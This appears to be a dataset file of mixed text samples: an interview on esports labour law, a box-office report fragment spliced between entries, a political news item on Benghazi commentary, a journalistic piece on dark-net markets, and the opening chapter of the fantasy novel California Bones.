  "latent_14915": "When an industry goes through an exploding growth in such little time like esports, all the actors involved – especially the players and clubs – soon find themselves facing pressing problems regarding governance and regulation designed specifically to protect their rights and image. We got the chance to talk about these pressing issues with Alberto González Andrades, founding partner of PROESPORTLAW, a new branch of the sports law department of Roca Abogados, a renowned Spanish law firm.\n\nThe pressing need for professionalization\n\n“Right now,” says Alberto, “The lack of professionalization of the sector leads to the greatest problems in the workplace and social security, especially at the level of clubs that do not have the support of larger structures behind themselves, such as football clubs or major sponsors.” In countries such as Spain, he explains, the current system makes it very difficult to hire minors or the guarantee for clubs that want a certain staff stability.\n\nIt is no secret that, as the industry grows, more and more companies are looking for a way into esports, especially sports organizations that identify the growing interest of millennials in esports. However, the impact of this industry and the benefit and investment it means is not always fully grasped by other more traditional industries, making that forced, uninformed first step into the esports world an extremely dangerous one, both for the prospective company and for the hopes of the professionalization of the sector.\n\n“A little over a year ago,” starts Alberto, “we were working with a Club to create a subdivision of esports within all of their other divisions (soccer, football, basketball, etc.), but the team’s management was reluctant to enter. Present at the meeting were some members of the club, some players and myself. The first question I received from a member of the board after discussing the possibilities was: “But… do these players charge?”. I was in shock.”\n\n“Many managers are quite traditional and do not see that esports generates a benefit to the Club,” adds Alberto, “and in these institutions and at these levels, money is what matters at the end of the day.”\n\nAside from sports organizations, however, there are more and more companies that decide to invest in the esports sector, some without previous knowledge or experience in this industry.\n\n“This is the recurring problem with companies betting on influencers… Companies don’t know how the system works, their campaign fails and the responsibility for their failure somehow falls on the YouTube.”\n\nAlberto insists on the need for companies to investigate the sector they are looking to invest in. “If you don’t, it will surely go wrong. It is absolutely necessary for proper research to take place, or to hire the right advisors, especially in this ‘strange’ moment in which the industry finds itself.”\n\nAlberto believes that esports is currently at a slightly delicate brand level, one in which teams are increasingly demanding more money for sponsorship and investment, in order to maintain rosters with costs which are inflated by the mere expectation generated by the sector.\n\nEsports labor law: The challenges in protecting the rights of players\n\nAccording to Alberto, the biggest problems we face in esports today are to do with contracts. “There is a brutal imbalance between Club and player, even more than in traditional sports,” he says, “And the reality is that, to this day, few Clubs would escape from the repercussions of losing a claim given the social impact of their players.”\n\nSo what can be done when most of the players don’t have an advanced legal working knowledge of how to protect themselves from unwanted clauses?\n\nAfter identifying this imbalance, part of PROESPORTLAW’s mission is precise to try to make players understand what kind of clauses they should avoid at all costs in a contract, and what types of clauses can give them that “plus” in the face of an unwanted claim.\n\nAlberto describes the contract negotiation between a club and player as a ‘harmonious dance’. However, they do go out of their way to ensure the pivotal aspects of the contract for their client, such as the player’s image and presence (social media), health in the private life of the player, creation of content and, as far as possible, the preservation of a place in the team.\n\n“Beyond the services we provide,” he goes on, “there should undoubtedly be a union or regulatory body that protects the rights of players. A union would be the logical step to give professionals (both players and staff) a way to continue advancing in the sector and improve these conditions imposed by the Clubs. In the long run, this would eventually stabilize the market in some way.”\n\n“Even though I understand the reasons some clubs in the highest competitions have given regarding a certain ‘bubble’ in salaries,” he adds, “I must recognize that the same defects that I identify in football I see multiplied by much in esports.”\n\nPublishers and integrity: Should there be a separate designated organization?\n\nCompanies that develop video games and event organizers, such as Riot Games ESL, or LVP, usually have established rules to ensure the integrity of competitions. The fact that there is no separate, globally designated organization to establish such standards and ensure such integrity in an impartial manner is, according to Alberto, a complex subject.\n\nWhen you compete in some type of tournament, you voluntarily submit to your own rules that you declare to know, which means that to impose a legal code and unique regulatory organization isn’t as necessary as we might think.\n\n“The point is,” argues Alberto, “however much we talk about it, it will never happen. Riot has its regulations, just like Valve, Blizzard … they have theirs. If you have control of something that belongs to you, you are not going to give it up for good.”\n\n“At the same time, the creation of compulsory arbitration tribunals to which both publishers and teams are subject, is, in my opinion, necessary, especially to avoid arbitrariness in the sanctions against which a certain company is accused.”\n\nSponsor contracts: Protecting a player’s image\n\nProfessional esports players, as in any other sport, inevitably catch the attention of different brands and sponsors, due to the fact that they represent an important advertising and marketing opportunity, and the chance to reach out to the millennial generation in the most effective of ways. We asked Alberto what players and teams should take into account when signing such contracts, and what can be done to protect the rights of the image of players in these cases.\n\n“Given the ‘lungs’ that companies have in comparison to the players,” he says, “I will always recommend that you do not go in to sign sponsorships blinded by “easy money” without first consulting with an expert.”\n\n“Issues of contract periods, payment terms and especially obligations in the generation of content and exploitation of image rights may end up turning a player-brand relationship into an undesired dispute.”\n\nSuch disputes are common in esports, a recent one being between Riot Games and Red Bull, which had to back out from sponsoring North America’s Team Solomid and Cloud 9 due to a conflict of interest with the publisher.\n\nUrgent regulation: What needs solving ASAP?\n\nThe array of different issues that could potentially ‘burst the bubble’ in esports is undeniable, but some issues are clearly more pressing than others. Alberto insists on the need of focus on labor law, and a solution to issues concerning hiring minors and the challenges behind a contract that favors the Club significantly more than it does the player, especially when we take into account the short-termism of current contracts:\n\n“We are in dire need of a distribution of obligatory awards,” he adds, “or a special system of compensation for contractual resolution, both in favor of the Club and in favor of the player.”",

In China, where Pitt is considered one of the biggest global stars, the spy thriller earned a soft $3.6 million from 10,000 locations.\n\nDisney also landed in the top five twice this weekend, with its Marvel film Doctor Strange taking in $6.5 million. With a domestic cume of $215.3 million, the Benedict Cumberbatch-starrer has now passed 2013's Thor: The Dark World ($206 million). Doctor Strange also has grossed $634.9 million globally to surpass 2010's Iron Man 2 ($624 million).\n\nThe weekend's only new wide release, BH Tilt’s Incarnate, opened to an estimated $2.6 million from 1,737 locations. It's a quiet start for the $5 million horror movie, which was aiming to do business similar to BH Tilt’s last film, The Darkness, which had a strong $4.95 million opening weekend in May.\n\nThe Aaron Eckhart-starring microbudget pic, however, had a more focused — and less costly — marketing plan, which targeted die-hard genre fans through through digitally focused outreach. The campaign, funded by Universal, cost in the low single-digit millions.\n\nThe audience for Incarnate was 47 percent Caucasian, 26 percent Hispanic and 18 percent African-American.\n\nOn the limited release front, Fox Searchlight opened Jackie in five theaters to $275,000 for a per-screen average of $55,000. The film, starring Natalie Portman and which is gathering awards buzz, was bought by Searchlight at the Toronto International Film Festival in September.\n\nAmazon and Roadside’s Manchester by the Sea, which picked up several awards and nominations this week, earned another $2.36 million as it expanded to 156 locations. The Kenneth Lonergan-directed, Casey Affleck-starring drama, buoyed by its awards buzz, should land in the No. 10 spot at the domestic box office this week.",
  "latent_15247": "Following the death of U.S. ambassador to Libya J. Christopher Stevens in Benghazi, many pundits jumped to criticize Republican presidential nominee Mitt Romney for labeling the Obama administration’s response to the crisis “disgraceful.”\n\nOn this weekend’s broadcast of “Fox News Sunday,” Fox News senior political analyst Brit Hume said that, although Romney’s remarks were ill-timed, the media’s reaction was the real problem.\n\n“I think what he said was correct but it was clumsy,” Hume said. “And it opened him up to charges that he made a terrible mistake. We had an almost ludicrous overreaction in a lot of the media about it in which what he did became the big story rather than what was happening over there, which was not a great moment for the national media, I’m sad to say. You know, he could have waited, it might have been better if he had.”\n\nHume said Romney was ultimately proven right when the White House walked back an apologetic statement issued by the U.S. embassy in Egypt just before Stevens’ death. In the statement, the embassy condemned an anti-Islam film that continues to outrage Muslims in the Middle East and voiced concern for the “religious feelings” of Muslims.\n\n“Look, what [Romney] was criticizing there was a statement that we were talking about in the first panel, which is the administration emphasis on this video and attacking it and reiterating that — the Cairo embassy not only said that, but it reiterated it later after these events unfolded,” Hume said. “So they doubled down on it. Eventually the White House walked it back and so on. But the next thing you know the White House is saying the same thing — that it is all about the video. So, my sense is that he was on the mark. He might have timed it better or said it better.”\n\nFollow Jeff on Twitter",
  "latent_15256": "Arturo Rodriguez / Associated Press The first ever e-commerce transaction, conducted by students from Stanford and MIT in the early 1970s, involved the sale of a small quantity of marijuana.\n\nFor decades afterwards, the online drugs trade was severely constrained by the ability of law enforcement to track IP addresses and the means of payment.\n\nThe trickle of transactions threatened to become a flood with the emergence a few years ago of Silk Road, a drug-dealing site on the \"dark net\". These e-depths cannot be reached through a normal browser but only with anonymising software called Tor. Buyers and sellers transact there pseudonymously in bitcoin, a crypto-currency.\n\nSilk Road was shut last year with the arrest of Ross Ulbricht, the 29-year-old American whom investigators believe to be Dread Pirate Roberts, the site's founder. Mr Ulbricht is due to stand trial in New York next January on charges that include computer hacking and money laundering.\n\nBut law enforcers who predicted that Silk Road's demise would mark the beginning of the end for online black-market bazaars were wrong. Instead, dozens of dark-net Amazons and eBays (also known as crypto-markets) have sprung up to fill the void. They are not only proving remarkably resilient but expanding their offerings and growing more sophisticated.\n\nThe number of for-sale listings in the 18 crypto-markets tracked by the Digital Citizens Alliance (DCA), an advocacy group, grew from 41,000 to 66,000 between January and August. The largest market until August, Silk Road 2.0 (whose logo, like its predecessor's, features an Arab trader on a camel), has since been overtaken by two upstarts, Agora and Evolution, whose combined listings have grown by 20%, to 36,000 in the past two months. Each of these three has more listings than the original Silk Road ever did (see chart). It is unclear whether listings are a good measure of sales, which the markets do not disclose.\n\nVendors vary in size: the largest turn over several million dollars a month on a single site, the smallest a few hundred. They pay a fee to register and a commission per transaction, typically 3-6%. Buyers come from all over the world. Their purchases are sent by post—the vast majority appear to arrive undetected. Customer satisfaction is high.\n\nIllegal and prescription drugs are the largest product category. (Some sellers are crooked pharmacists.) Silk Road 2.0, whose operators are avowedly libertarian, focuses almost exclusively on weed, powders and pills. Agora, whose mascot is an armed bandit, sells weapons, too. These are marketed mostly to Europeans, who face strict gun-control laws.\n\nThe fastest-growing of the big three, Evolution, is the least principled. Though, like the others, it bans child pornography, it hawks stolen credit-card, debit-card and medical information, guns and fake IDs and university diplomas. One-fifth of its listings are in its \"Fraud\" section or in \"Guides and Tutorials\", which often explain how to commit crimes. Some see Evolution's rapid growth as a worrying sign that cyber-criminals are looking to fuse their identity-theft operations with the \"victimless\" online drugs trade. (It is not, however, the most unsavoury corner of the dark net, where some make markets in contract killings.)\n\nFor drug buyers, online markets offer several advantages. They are less physically dangerous than street trades. This goes for dealers, too: a recent study found that a third or more of sales on Silk Road were to \"a new breed of retail drug dealer\", a transformation of the wholesale market that \"should reduce violence, intimidation and territorialism.\"\n\nEconomist Product quality is higher, largely thanks to an Amazon-like five-star customer-review system. With 29 reviews for the average listing on Silk Road 2.0, a high score provides reassurance. MDMA (or ecstasy) is particularly popular on the site, presumably because the street version can be laced with lethal impurities. The dark net's hundreds of forums provide further intelligence on dodgy gear and scammers. The FBI made over 100 purchases on Silk Road before closing it down. An agent testified that these showed \"high purity levels\".\n\nHigh ratings are sellers' lifeblood. Reputation is crucial when clients know they cannot fall back on small-claims courts or arbitration. \"It's the ultimate irony: a den of thieves who don't know each other but need to trust each other,\" says a researcher with the DCA who requested anonymity for reasons of security.\n\nDark-net Amazons and eBays (also known as crypto-markets) are not only proving remarkably resilient but expanding their offerings and growing more sophisticated.\n\nAs drug sales move online, power is shifting to buyers. The big markets' customer service and marketing strategies increasingly resemble those of legitimate retailers. They are quick to apologise for technical glitches. Two-for-one specials, loyalty discounts and promotional campaigns are common (on Smoke Weed Day, say). Other methods borrowed from the corporate world include mission statements, terms and conditions, and money-back guarantees. \"It has become so prosaic it could be shoes,\" says James Martin, author of \"Drugs on the Dark Net\".\n\nMarkets are also innovating to cut fraud. In the free-for-all in the months after Silk Road's closure, thousands of buyers lost bitcoins that were supposedly held in escrow, either because markets were hacked or because their administrators ran off with the money.\n\nThe emerging solution is \"multi-signature\" escrow, from where funds can be moved only with the approval of a least two of the three interested parties (buyer, seller and market). Some markets are trying to build a community of trusted buyers and sellers with invitation-only participation. Those whose customers had bitcoins stolen have begun to devise schemes to make them whole.\n\nSites that specialise in stolen card data display their own brand of customer-friendliness. Some offer a service that allows buyers to verify purchased cards are still active, using compromised merchant accounts. The client's balance is automatically refunded the value of cards that are declined. (Cards sell for anywhere from $10 to $100 each.) Others batch their cards for sale according to the location of the hacked retailer, says Brian Krebs, a cyber-security blogger.\n\nBuyers favour cards stolen from consumers who live nearby because banks often treat transactions as suspicious if they take place far from the legitimate cardholder's home address. A site that has pioneered this segmentation is McDumpals. Its logo features a gun-toting Ronald McDonald and its motto is \"I'm Swipin' It\".\n\nSeveral factors make life hard for those looking to crack down on the dark net, including its technical complexity, the physical separation of buyers and sellers, and their mobility (vendors typically post on more than one market, allowing them to keep selling if a site goes offline).\n\nTellingly, the only market forcibly closed since Silk Road was Utopia, which was shut by Dutch authorities soon after it opened in February. Some law enforcers want to target Tor, but even if that were technically possible it would cause \"collateral damage\", points out Nicolas Christin of Carnegie Mellon University, because the software has worthy uses, such as to protect whistleblowers.\n\nMoreover, the deep web's denizens will continue to adapt. Jamie Bartlett, author of \"The Dark Net\", predicts: \"The future of these markets is not centralised sites like Silk Road 2.0, but sites where…listings, messaging, payment and feedback are all separated, controlled by no central party\"—and thus impossible to close.",

  "latent_15514": "Check out Greg van Eekhout’s California Bones, an epic adventure set in a city of canals and secrets and casual brutality, available June 10th from Tor Books!\n\nWhen Daniel Blackland was six, he ingested his first bone fragment, a bit of kraken spine plucked out of the sand during a visit with his demanding, brilliant, and powerful magician father, Sebastian. When Daniel was twelve, he watched Sebastian die at the hands of the Hierarch of Southern California, devoured for the heightened magic layered deep within his bones.\n\nNow, years later, Daniel is a petty thief with a forged identity. Hiding amid the crowds in Los Angeles—the capital of the Kingdom of Southern California—Daniel is trying to go straight. But his crime-boss uncle has a heist he wants Daniel to perform: break into the Hierarch’s storehouse of magical artifacts and retrieve Sebastian’s sword, an object of untold power.\n\nFor this dangerous mission, Daniel will need a team he can rely on, so he brings in his closest friends from his years in the criminal world. There’s Moth, who can take a bullet and heal in mere minutes. Jo Alverado, illusionist. The multitalented Cassandra, Daniel’s ex. And, new to them all, the enigmatic, knowledgeable Emma, with her British accent and her own grudge against the powers-that-be. The stakes are high, and the stage is set for a showdown that might just break the magic that protects a long-corrupt regime.\n\nOne\n\nDaniel Blackland’s clearest memory of his father was from the day before his sixth birthday, when they walked hand in hand down Santa Monica Beach.\n\nThat was the day Daniel found the kraken spine in the sand. It was a slate-gray morning, and Daniel shivered without a jacket, but he wouldn’t complain. The soggy air carried rollercoaster screams from the pier, and Daniel hoped for a ride. Maybe he and his father would even drive the bumper cars, teaming up to bash other kids and their parents. But then he spotted the bone splinter in the foam of the receding surf, a silvery fragment the length of a knitting needle, rising from the sand like an antenna. Years later, he would wonder if his father had planted it there for him to find, but on this day, he\n\nhadn’t yet learned that level of suspicion.\n\nThe sliver drew him like a magnet. Breaking contact with his\n\nfather’s grip, he ran across the wet-packed sand to claim his prize. When he brought it back, his father held the spine to his long, bent nose, and his dark eyes focused like a microscope over a glass slide. He took an aggressive sniff, as though he were trying to suck the soul out of it. In his white dress shirt and gray slacks, he resembled one of the seagulls wheeling overhead, and Daniel imagined him spreading his long arms to catch the wind and take flight.\n\nDaniel’s mom once said his father was made of air. “Sebastian Blackland’s not down here with us. That’s why he’s hard to understand. Spend too much time searching the sky for your father and you’ll just crimp your neck.”\n\nSebastian held the sliver up to the weak sun. “Kraken. We hardly ever find these anymore. Not outside of the Ossuary, anyway. But something must have dredged it up from the sea floor, and then the currents carried it here, right in your path, just for you. It’s not surprising. I’ve used a lot of kraken in my work, so it’s in my bones, and I’ve passed some of that affinity to you.” He handed the spine back to Daniel. “The kraken used to live in the great deeps. They were creatures of storms and wind and rain and lightning. Not much in the way of solid skeletons, so their remains are rare.”\n\nHe paused and looked at Daniel, and Daniel felt as though he were being measured. He held his father’s gaze, struggling to triumph over squirms and fidgets.\n\n“This is a good find, Daniel. Better than most of the La Brea fossils. The kraken is even older, with deeper osteomancy.”\n\nDaniel glowed. His father didn’t lavish idle praise.\n\n“Find me a seashell,” he instructed Daniel. “Abalone would be perfect, but I’ll take anything from the ocean I can use as a crucible.”\n\nDaniel raced off. He found no abalone, but from a tangle of seaweed swarming with sand fleas, he excavated half a large mussel shell. He rinsed it in the surf, dug out some stubborn sand grains with his fingernails, and rinsed it again before bringing it over for Sebastian’s inspection.\n\n“Good,” Sebastian muttered. “This will be good.”\n\nThey sat cross-legged on the sand together.\n\n“Do you trust me?”\n\nThis was a serious question. An important one. Usually his father’s eyes roamed when he spoke, looking at things Daniel couldn’t see. Now, they saw only Daniel.\n\nDaniel loved him with the uncomplicated desperation with which small boys love their fathers. But trust? It had never occurred to Daniel not to trust him. It was like earth. Daniel never wondered if it’d be there when he took a step. Now, the smallest of fissures opened in his unquestioning certainty.\n\n“I trust you,” Daniel said, because he knew it was what his father wanted to hear.\n\nHis father took the mussel and kraken spine and set them both on the sand. From a leather zipper case, he produced his scalpel. The handle was polished bone, coffee-stained from millennia in tar and so well used that there were indentations where his fingers gripped it. The blade was fashioned from the tooth of a Vipera americanus.\n\n“I’m a powerful man,” he said. It didn’t sound boastful. It was a simple fact. “Some people want what I have. They’re not dangerous to me, because I’m stronger than they are. But there are other people who are more powerful than me, and they’re afraid I’ll want what they have. Those people are very dangerous to me. And because you’re my son, they’re dangerous to you. So, I have two choices. I can keep you ignorant and weak. Or I can try to make you strong. Do you understand?”\n\n“Not really,” Daniel said.\n\nHis father’s smile formed a pale seam in his face. “No, of course not. I’m not sure I do either. But you said you trust me. And there will be times when I ask you to do hard things. Things that hurt. Things that make you cry. But I’m doing them for your own good, so that when you grow up, you’ll be strong. Stronger than me. Stronger than the people who are stronger than me. Can you understand that, at least?”\n\nDaniel nodded.\n\n“Good,” said his father.\n\nDaniel watched his father’s hands work the kraken with the scalpel, curling away shavings and letting them drop into the shell. Sometimes Sebastian spoke as he worked, instructing Daniel in the way his teachers must have instructed him. He spoke of Elysia chlorotica, a sea slug he’d been studying that stole genes from the algae it ate and gained the ability to convert sunlight to energy. A natural osteomancer, he called it. But sometimes his words couldn’t express what he was doing. Sometimes Daniel could only watch and smell. Some of what he smelled now was earthly—the salt and mud and sour rot of things from the bottom of the sea. And some of it was osteomantic, impressions of ancient things, lurking deep, of old power, of electric anger, waiting to discharge.\n\nNext from the zipper case, Sebastian produced his torch. In outward appearance it looked very much like a cigarette lighter of burnished copper, but it was an intricate instrument with inner workings as complex as a fine watch. Sebastian thumbed it open and dialed the flame to a precise temperature. He applied it to the bottom of the shell, and the flame changed color, fading from intense red to pale peach, and then to an invisible heat. The flame wasn’t just coming from the torch. Daniel’s father was fueling it, too, and his heat baked Daniel’s face.\n\nFor a stretch of time, nothing happened. Sebastian remained perfectly still, holding the torch steady. Daniel’s foot began to fall asleep, so he counted ocean waves to take his mind off the tingling. By the time he got to seventy-five, the kraken shavings had melted to a tiny pool of molten silver. Sebastian spit into the shell. He wasn’t a tobacco user, but his saliva was the same rich brown as the tar-infused bone handle of his scalpel. The kraken shavings burst into flame, with tall flickerings of gasjet blue.\n\n“Our bodies are cauldrons,” he said, “and we become the magic we consume.”\n\nHe often said things like that, things that circled around the perimeter of Daniel’s understanding, sometimes veering just within reach before darting away into ever-widening orbits. Daniel could remember the names of osteomantic creatures and their properties—mastodon for strength, griffin for speed and flight, basilisk for venom—but he grew lost when Sebastian spoke of the root concepts of magic.\n\nThe blue flame deepened to a dark royal color, like the flags that snapped above the Ministry of Osteomancy building where Sebastian worked. When the flames shrank and died, he capped the torch and held the mussel-shell crucible out to Daniel.\n\n“Drink,” his father said, not in the firm tone he used when Daniel didn’t want to eat his brussels sprouts, but softer, more encouraging, almost a whisper of anticipation. “Drink.”\n\nDaniel obeyed. He lifted the shell to his mouth, took a breath for courage, and touched his tongue to the fluid. His tongue blistered in an instant, and his taste buds charred and fell away. His hand jerked in pain, but his father’s strong fingers steadied his wrist, and Daniel spilled no kraken.\n\n“Drink,” he said again, and maybe it was the pain, or maybe the magic, but it sounded as though his father’s voice had come from the crucible.\n\nDaniel tipped the shell back and let the scalding silver slide down his throat. At first there was only fire and searing pain. He tried to scream but all that came out was a strangled croak, and in that croak was stored not only physical agony, but deeper injuries of betrayal. His father had done this to him. He was in pain because of his father.\n\nAnd then Sebastian’s cool hand cupped the back of Daniel’s head, as if he were an infant and his father were cradling him, and the pain went away, replaced by flavors and aromas of secret places in deep, sunless waters, and great black pressures from the miles of vertical ocean. Daniel was a skeleton swimming in the sea-water cage of his own body, and the pressure suddenly gave way and Daniel shot to the surface.\n\n“Quick, now, Daniel. Hold my hand.”\n\nLight-headed, Daniel gripped his father’s hand as tight as he could. A prickling sensation raised goose bumps on Daniel’s skin. The tiny hairs on his arms stood at attention, and his blood popped like cola.\n\nGulls cried overhead and waves hammered the shore. Daniel looked up at Sebastian. His face was a blur, and Daniel realized his father was vibrating, and Daniel was vibrating with him.\n\n“Don’t be afraid,” his father said, voice shuddering. “I’m strong.”\n\nLightning struck. Silver-white cracking bursts. Threads of blinding light coursed over Daniel’s arms and legs, snaking around his chest and rib cage and mingling with the lightning coming off his father. Pain gouged his flesh. He screamed, desperate to let the pain fly from his body, but there was only more pain. His body was a sponge for it, with limitless capacity. Pain replaced everything.\n\nAfter a time, Daniel’s world settled and he could once again see. Fused sand, pools of black, gooey glass, thick as La Brea tar, smoked and bubbled around them.\n\n“The kraken was a creature of storms,” Sebastian said. “It’s been a part of me for a long time, ever since I consumed my first one, when I wasn’t much older than you. And now it’s yours. That’s the osteomancer’s craft, to draw magic from bones. To capture it and store it, to use the creatures’ power, guided by human intelligence. One day you’ll be able to use the kraken’s power as you will. Understand?”\n\nSebastian studied him a long time. The pain was over, but the memory of it roiled inside Daniel, like smoke from a fire.\n\nHe felt strong.\n\n“I understand.”\n\nNot all Sunday visitations were like this. There were also days at the movies, and miniature golf in Van Nuys, or at the water park in San Dimas. But by the time Daniel was twelve, the outings tapered off and weekends were spent at Sebastian’s house, a warren of tilting walls jammed into the earthen gouge of Topanga Canyon. The area was popular with artists and musicians and chefs and osteomancers. Daniel didn’t like their children. They had names like Aquarius or Oat and a lot of them didn’t wear shoes. Daniel was jealous of them. They had time to screw around with skateboards and bikes. They had time to shoplift CDs from Rhino Records. Not that normalcy was an entirely foreign country to Daniel. Monday through Friday, at home with his mom, things were kept as normal as possible. But the weekends were marathon lessons with his dad, and that world was full of bones and oils and feathers and powders. He learned about Colombian dragon and smilodon and eocorn, the primitive New World unicorn. He learned about osteomancy imported from other lands, like abath from Malaysia and criosphinx from North Africa. And he learned to use the osteomancy already in him. He could generate sparks from his fingertips without having to consume more kraken. His father fed him a lot of magic.\n\nOn the last day he saw his father alive, Daniel watched a little nugget of bone bob in a kettle of boiling oil. Sebastian lifted it with a copper spoon and sniffed it. “Tell me what this will do,” he instructed.\n\n“I have no idea,” Daniel said, giving the bone a cursory sniff. Outside was a blue sky and a warm sun and a short gondola-bus ride to the beach, where Daniel fancied he could rent a surfboard and maybe figure out a way to impress a girl. He didn’t want to be here with the curtains drawn, breathing air full of dead things that stank.\n\nSebastian dipped the bone back into the oil. “Try, Daniel. Let it in. Let it talk to you.”\n\nHis father wouldn’t give up, and there was still a part of Daniel that wanted nothing more than to please him. Resigned, he lowered his face to the kettle. At first all he detected were his father’s tells: There was clean sweat. Shaving soap. And tar, deeply embedded, from the marrow of his father’s bones. And there was also something of Daniel. The ghosts were all mixed up, and Daniel couldn’t tell where his father’s smell ended and his own began.\n\n“What is our essence?” Sebastian asked.\n\nDaniel had answered this question a thousand times. He answered it again. “Cells.”\n\n“And what is the essence of the cell?”\n\n“The molecule.”\n\n“Was that your mind answering, Daniel, or just your mouth?”\n\n“Molecules,” Daniel repeated, adding a touch of drone in order to make himself sound as brainless as possible. But taking the time to answer, even in his smart-assed way, forced him to concentrate on the word just enough that he involuntarily began to envision molecules, like knotted beads twisted into esoteric chains.\n\nSebastian smiled, enjoying his small victory. “And what is the essence of the molecule?”\n\n“The atom.”\n\n“And the essence of the atom?”\n\n“Electrons, protons, neutrons. And quarks.”\n\nThis was where Sebastian Blackland had made his innovations in magic. He’d followed the research in nuclear and particle physics, reading papers smuggled into California from the United States, seeking to understand the fundamental nature of matter on a finer-grain level than his colleagues at the Ministry of Osteomancy. Ultimately, he felt that magic came from understanding matter, so he sought to understand matter as deeply as he could.\n\n“What is at the heart of the subatomic particle?”\n\n“Energy,” Daniel said, his answers more than recitation now. Sometimes he felt he was coming close to understanding his father’s model of magic, and that’s when he felt nearest to those beach-walk afternoons of long ago. But his understanding was like a whiff of vapor that stole away on the breeze.\n\n“What bridges energy and matter?” Sebastian continued.\n\n“Magic,” said Daniel.\n\n“Trick question,” Sebastian said, a little mischievous now. “Magic transcends energy and matter. Magic transcends the laws of thermodynamics. An osteomancer consumes a creature, and not only does he use its power, but he increases it.” He stirred the pot again. “If he’s any good, that is. Now. Smell the preparation again.”\n\nDaniel moved his face over the bubbling kettle. He shut his eyes and thought of chains and links and impossibly small bits of matter and impossibly huge parcels of energy.\n\n“Well?” Sebastian whispered, close to Daniel’s ear.\n\n“It’s sint holo?” The sint holo was an extinct horned serpent from the American southeast.\n\n“Yes,” Sebastian said. “And what does it do?”\n\n“I don’t know,” Daniel said. “It’s like something I can’t hold on to. It’s like confusion.”\n\nSebastian straightened, smiling, and Daniel felt his head swim. Maybe from the fumes. Maybe from pride.\n\n“That’s right. Sint holo remains transfer properties of invisibility. It’s for a weapon I’m making. Part of a sword blade. Want to see?”\n\nDid Daniel want to see? Was he kidding? What kind of wizard’s son would he be if he didn’t want to see his father’s sword? He’d read a book about the swords the Hierarch had used in the Battle of Santa Barbara, and he knew if he ever became a true osteomancer, he’d specialize in making magic swords.\n\n“Okay,” Daniel said.\n\nHe imagined Sebastian would take him through some secret doorway, down a passage to an underground vault, and that the sword would be displayed in a magnificent case, or embedded in a stone. Whenever Daniel heard mention of the Ossuary catacombs, where his father worked, that was how he envisioned it. Instead, Sebastian took him to a bureau in a spare bedroom stuffed with books and file cabinets. He slid open a long, flat drawer, from which he took out a towel-wrapped bundle. He set it carefully on the bureau and peeled back the terry cloth.\n\nIt looked… okay. The pommel was a round metal disc welded onto a bare tang, and the guard was an unadorned crossbar. The leaf-shaped blade was kind of short, a little over two feet long and in need of a polish. Running down the blade, almost from guard to point, was a sort of channel inlaid with bone chips. Many were the rich brown of La Brea fossils. Others were tan or gray or white. A few were iridescent pearl, or the rich jewel tones of a church window. Some of the chips appeared to be assembled from smaller pieces, little nuggets of bone, or teeth.\n\nThe inlay only ran halfway up the blade, indicating many more hours of toil left to be done.\n\n“Does it have a name?” Daniel asked. All great swords had names. The Hierarch’s was called El Serpiente.\n\n“Not yet. I’ve been calling it the Vorpal Sword for now, just for convenience. It’s kind of a joke from Lewis—”\n\n“‘Jabberwocky,’ I know. Mom read it to me.”\n\n“Ah. Good,” said Sebastian. “Well, whoever finishes the sword gets to name it, because it’ll have that person’s essence.”\n\nDaniel pointed out the bone chips. “What do they do?”\n\nHis father’s eyes shone. He somehow managed to betray giddy excitement and remain grave at the same time. “Right now, the sword does everything I do. It has kraken properties, and firedrake. Thunder and flame. Sint holo will make it hard to defend against. But we won’t know all its properties until you’re finished.”\n\n“I’m finishing the sword?”\n\n“Yes, that. But I also meant we won’t know what it’s capable of until you’re finished. Here, look at this.” His father ran his finger along some of the inlaid chips. “These are your baby teeth. And these threads between them are made from your hair clippings. And these lacquered bits here? I made those from your tonsils.”\n\nDaniel’s tonsils came out when he was five. He didn’t remember why. He didn’t remember being sick. He just knew his father had taken him to a doctor and then his throat hurt and there was ice cream.\n\n“Your magic is in this,” said his father. “And you’ll keep growing your magic, and you’ll keep investing in this weapon, and in others. Using the magic brewing inside you… that’s deep magic. That’s osteomancy.” He gestured at his work counter, littered with jars and vials and little envelopes. “Everything else is just recipe. It’s so important you learn that, Daniel. It’s important you make powerful weapons. That you be a powerful weapon.”\n\n“Why?”\n\n“Because the Hierarch is making very good weapons.”\n\nHe rewrapped the sword in its towel and returned it to its drawer. Back in the kitchen, he dialed down the heat on the boiling sint holo bone and fitted a heavy copper lid over the kettle. “It still needs to simmer awhile. So, let’s use our time to—”\n\n“Can we go somewhere?” Daniel interrupted.\n\n“Go somewhere?”\n\n“Yes. Somewhere outside? Or at least somewhere with natural lighting?”\n\nSebastian’s gaze skated worriedly over his work counter.\n\n“It doesn’t have to be Disneyland or anything like that,” Daniel pressed on. “We can even just stand out on the curb. We can gaze into the mysterious shadows of the canal and you can tell me all about the osteomantic properties of carp or canal scum or anything you want—”\n\n“Okay,” Sebastian laughed. “Okay. What do you really want to do?”\n\n“Mini-golf and go-carts.”\n\nSebastian’s eyes warmed. “Aren’t you getting a little old for that?”\n\n“Also, I want to destroy you at skee ball.”\n\n“It’s good to have ambition. I’ll get my keys.”\n\nThey left the workroom together and entered the living room, little more than a narrow pathway between teetering boxes that went almost to the ceiling. The boxes contained the books and papers Sebastian had hauled over from his Ministry office.\n\nFrom outside, the sound of a helicopter rotor chopped the air. Sebastian went to the window, but came away when the phone rang. He lifted the receiver.\n\n“This isn’t a good time, Otis,” he said. And then for a while he didn’t speak, but only listened.\n\n“Who else did they get?” Whatever the answer, it made him shut his eyes. When he opened them, he looked over to Daniel, and for the first time in his life, Daniel saw his father’s fear.\n\n“You’ll take care of them?” Sebastian said into the phone. “Promise me, Otis. Promise me.”\n\nThere was a short pause, and then he returned the receiver to its cradle.\n\nOut on the canal, boat doors slammed. Sebastian pushed Daniel back into the kitchen.\n\n“The sint holo isn’t ready yet,” he said, lifting the lid of the simmering pot. “But it will help you, at least for a little while.”\n\n“What’s going on, Dad?”\n\n“Wait as long as you can before swallowing it, and when you walk, make no noise. Take the sword, and go to 646 Palms Boulevard. Your mother will meet you there. Wait for Otis, and he’ll help you and your mom get out of Los Angeles.”\n\n“Dad…”\n\nHe ruffled Daniel’s hair and placed a priestly kiss on his forehead, just like he used to do when putting Daniel to bed. Then he went into the living room and shut the door, leaving Daniel alone.\n\nHere, Daniel’s memory of what happened became less clear. Mostly, he remembered noise and light. Splintering wood and boots pounding the hardwood floor. Shouts. Then, cracks of thunder, so close, like bombs detonating between his ears, the loudest thing he’d ever heard.\n\nAfter that, a brief silence, followed by soft footsteps outside the kitchen.\n\nDaniel ran to the stove, where the kettle rested over the flame of the burner. The bone still tumbled in the low boiling oil. 